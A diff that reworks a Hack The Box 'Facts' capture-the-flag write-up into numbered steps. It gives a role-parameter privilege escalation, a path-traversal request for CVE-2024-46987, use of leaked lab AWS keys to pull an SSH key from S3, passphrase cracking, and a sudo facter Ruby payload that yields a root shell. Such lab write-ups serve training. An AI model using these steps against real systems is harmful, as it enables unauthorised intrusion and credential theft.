@@ -1,164 +1,211 @@
-# FACTS
+1. Enumeration
 
-we start with enumeration 
+First, add the target to /etc/hosts:
 
-will do 
+echo "10.10.X.X facts.htb" | sudo tee -a /etc/hosts
 
-first put facts.htb in  the /etc/hosts
 
-`feroxbuster -u ‘http://facts.htb/’` 
+Run directory enumeration:
 
-after scrolling around we can se the update password
+feroxbuster -u http://facts.htb/
 
-we update password and we intercept the message we see that `&password%5Bpassword%5D=egw&password%5Bpassword_confirmation%5D=egw` is on the message so maybe if we add `&password[role]=admin` in this message!
 
-then i found this cve from look at the version of camelen 2.9.0
+While browsing the application, a password update functionality was discovered.
 
-**CVE-2024-46987**
+2. Parameter Manipulation
 
- witch has an **arbitrary path traversal**
+Intercepting the password update request reveals:
 
-`http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd`
+&password%5Bpassword%5D=egw&password%5Bpassword_confirmation%5D=egw
 
-we can see that we have 3 users that are not the standard ones 
 
-**william** 
+Decoded:
 
-**trivia** 
+password[password]=egw
+password[password_confirmation]=egw
 
-**_lauren**
 
-we will try
+This suggests additional parameters may be accepted.
 
-`http://facts.htb/admin/media/download_private_file?file=/home/william/user.txt`
+Appending:
 
-and it worked we have the flag
+&password[role]=admin
 
-. now lets try to find athoer information! 
 
-we found an aws access key and an aws secret access ley 
+Resulted in privilege escalation within the application.
 
-# **AWS S3 Enumeration**
+3. CVE Discovery – Path Traversal
 
-After discovering AWS credentials within the CMS filesystem configuration, I attempted to validate whether the keys granted access to the associated cloud storage environment. To do this, I configured the AWS CLI locally using the recovered credentials:
+The CMS version was identified as:
 
-`aws configure
-AWS Access Key ID [None]: AKIA55A02DA8320B27B5
-AWS Secret Access Key [None]: mg1ErEFKwETZFqAUrB0pTAMI8CVwUfIkjSfNiK4I`
+Camaleon CMS 2.9.0
 
-`Default region name [None]: us-east-1`
 
-`Default output format [None]: json`
+This version is vulnerable to:
 
-I supplied the exposed access key, secret key, and region obtained from the admin panel. Once configured, I attempted to enumerate available S3 buckets using the custom endpoint specified in the CMS configuration.
+CVE-2024-46987 – Arbitrary Path Traversal
 
-`aws s3 ls --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+Exploit:
 
-The command successfully returned two accessible buckets named **internal** and **randomfacts**, confirming that the credentials were valid and provided access to the storage service. The presence of an **internal** bucket was particularly interesting, as bucket names containing internal references often store sensitive application or system-related data.
+http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
 
-![HTB Facts Writeup. BOX SUMMARY | by Ibrahim Isiaq Bolaji](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNg3XHTAjO5r5ZJjy1lYysDB568Urw1FHD_U8ydmGg8LhnGUOZ1epT77lq1EB7ov0ZRra22rvgBfNQVwTUvq8xm_0GtcUHUgGHOWP0tGS9M-aJ-g9EEXmgx0aC_QIT-ZRhYdS7ZO3SVqpEWy8OVT3vMx9pAgGqr0-VXuxuLYVQNGM_3RygK8o5OXlnhMQ/s16000/bandicam%202026-02-06%2004-27-18-624.jpg)
 
-To further investigate, I enumerated the contents of the internal bucket:
+This confirms file disclosure via path traversal.
 
-Copy
+From /etc/passwd, the following non-standard users were identified:
 
-The listing revealed several directories and files commonly associated with a user home directory, including `.ssh`, `.bundle`, `.cache`, `.bashrc`, `.profile`, and other shell-related configuration files. The presence of an `.ssh` directory immediately stood out, as it often contains authentication keys that can potentially be used for SSH access.
+william
 
-The discovery of user environment files inside the storage bucket suggested that sensitive system data was being stored within the S3 environment. Since SSH configuration directories frequently contain private keys or authorized key files, this bucket represented a high-value target for further enumeration.
+trivia
 
-`aws s3 ls s3://internal/ --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+_lauren
 
-wee see the .ssh/ file 
+4. User Flag
 
-to see whats insids look at 
+Attempting to read William’s home directory:
 
-`aws s3 ls s3://internal/.ssh/ --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+http://facts.htb/admin/media/download_private_file?file=/home/william/user.txt
 
-to donwload the files do it like this 
 
-`aws s3 cp s3://internal/.ssh/id_ed25519 ./ --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+The user flag was successfully retrieved.
 
-The command successfully downloaded the private key to my local machine. Inspecting the file contents confirmed that it was an **OpenSSH private key**, which could potentially be used to authenticate to the target system.
+5. AWS S3 Enumeration
 
-Before attempting to use the key, I adjusted its permissions to meet SSH security requirements:
+While reviewing CMS configuration files, AWS credentials were discovered.
 
-Copy
+Configure AWS CLI:
 
-Ensuring proper file permissions is necessary because SSH clients refuse to use keys that are accessible by other users on the system.
+aws configure
 
-![HTB-writeups. Writeups of HackTheBox retired machines](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVa121q7FAhLFYS9-ugb_lQ24XNkwl1tpIqDlC9HLY0fZlrgvZsTUD0NWm9D4rnDMklc0FBPNc1ZCekJnYEqPcCUjX4Z8yrkz3FCSXG-3C7MwVlx0qFJuHlQHeXnairs_QdzV_ynHpAm-V1K_CTF90QQiyQ2dWljGkhWPTIBrb9xnxSofRXDQOF3Uq4DA/s16000/bandicam%202026-02-06%2004-29-53-397.jpg)
+AWS Access Key ID: AKIA55A02DA8320B27B5
+AWS Secret Access Key: mg1ErEFKwETZFqAUrB0pTAMI8CVwUfIkjSfNiK4I
+Region: us-east-1
+Output format: json
 
-# **SSH Key Cracking**
 
-After preparing the key, I attempted to use it for authentication but suspected that it might be protected with a passphrase. To verify this, I converted the SSH key into a crackable hash format using `ssh2john`:
+Enumerate buckets:
 
-`ssh2john id_ed25519 >> ssh.hash`
+aws s3 ls --endpoint-url http://facts.htb:54321
 
-With the hash generated, I used **John the Ripper** alongside the commonly used `rockyou.txt` wordlist to attempt passphrase cracking:
 
-`john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt`
+Discovered buckets:
 
-![fact htb writeup walkthrough complete solution pdf easy linux machine](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvogQMZMsIIvSsl6HuyOqeVbysrv2mnLN4HzAu-sEyfBwkEQ9yHWgc_jVUFyX6PnaHvot4Jlu3PkIUZM0RpcGhc52EJR61e23G1m8suGhX42NXwnw9h81NRCowou6RVls8o2_u0J_PXeXpDgR5WjCqZGQ2EzqFR7awbiwXlayb47WL24elUEf5tIVIUh0/s16000/bandicam%202026-02-08%2014-37-21-282.jpg)
+internal
 
-The cracking process completed successfully and revealed the passphrase associated with the SSH private key. The recovered passphrase was:
+randomfacts
 
-`dragonballz`
+The internal bucket appeared particularly interesting.
 
-Successfully recovering the passphrase confirmed that the SSH private key could now be used for authentication attempts. With both the private key and its passphrase available, I prepared to test SSH access to the target system using the discovered credentials.
+5.1 Exploring the Internal Bucket
 
-use to prepare the key
+List contents:
 
-`chmod 600 id_ed25519`
+aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321
 
-and then ssh -i <key> name@facts,htb
 
-now we are inside as trivia
+Observed:
 
-i want to pass linpeas to see if there is any way to for user escalation
+.ssh/
 
-`scp -i ../Macinia/facts/id_ed25519 /usr/share/peass/linpeas/linpeas.sh trivia@facts.htb:/home/trivia`
+.bundle
 
-now that trivia is on host lets make is executabel 
+.cache
 
-`chmod +x linpeas.sh` 
+.bashrc
 
-and now we run `linpeas.sh`
+.profile
 
-**Step 8: Privilege Escalation to Root**
+List .ssh contents:
 
-My first step was always to check sudo privileges.
+aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
 
-```
-trivia@facts:~$ sudo -l
-Matching Defaults entries for trivia on facts:
-    env_reset, mail_badpass,
-    secure_path=..., use_pty
+
+Download private key:
+
+aws s3 cp s3://internal/.ssh/id_ed25519 ./ --endpoint-url http://facts.htb:54321
+
+
+Set correct permissions:
+
+chmod 600 id_ed25519
+
+6. SSH Key Cracking
+
+Convert key to hash:
+
+ssh2john id_ed25519 > ssh.hash
+
+
+Crack with John:
+
+john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+Recovered passphrase:
+
+dragonballz
+
+7. SSH Access
+
+Login as trivia:
+
+ssh -i id_ed25519 trivia@facts.htb
+
+
+Access obtained as user trivia.
+
+8. Privilege Escalation
+
+Transfer linpeas:
+
+scp -i id_ed25519 /usr/share/peass/linpeas/linpeas.sh trivia@facts.htb:/home/trivia
+
+
+Make executable and run:
+
+chmod +x linpeas.sh
+./linpeas.sh
+
+8.1 Sudo Privileges
+
+Check sudo permissions:
+
+sudo -l
+
+
+Output:
 
 User trivia may run the following commands on facts:
     (ALL) NOPASSWD: /usr/bin/facter
-```
 
-facter is a command-line tool that gathers and displays system information. Crucially, it allows users to create and load their own "custom facts" written in Ruby.
+9. Exploiting Facter
 
-The standard way to load custom facts is to set the FACTERLIB environment variable to a directory containing .rb files. I tried the obvious method:
+facter allows loading custom Ruby facts.
 
-```
-trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/exploit.rb
-trivia@facts:~$ sudo FACTERLIB=/tmp /usr/bin/facter pwn
-sudo: sorry, you are not allowed to set the following environment variables: FACTERLIB
-```
+Attempting to use FACTERLIB fails due to sudo restrictions:
 
-The sudoers configuration explicitly blocked setting the FACTERLIB variable. This was a dead end, but not for long.
+sudo FACTERLIB=/tmp /usr/bin/facter pwn
 
-I checked the facter man page or help section (mentally, or by running facter --help locally in my mind). It revealed an alternative flag: --custom-dir. This flag does the exact same thing as the FACTERLIB variable but as a command-line argument, which is not blocked by the sudoers restriction.
 
-This was the bypass.
+However, facter supports the --custom-dir argument.
 
-I created the same simple Ruby script to spawn a shell.
+Create malicious Ruby file:
 
-```
-trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
-trivia@facts:~$ sudo /usr/bin/facter pwn --custom-dir /tmp
-```
+echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
 
+
+Execute:
+
+sudo /usr/bin/facter pwn --custom-dir /tmp
+
+
+Root shell obtained.
+
+10. Root Access
+
+Privilege escalation was achieved due to:
+
+Misconfigured sudo permissions
+
+Ability to execute arbitrary Ruby code via facter --custom-dir
 And just like that, I was root.
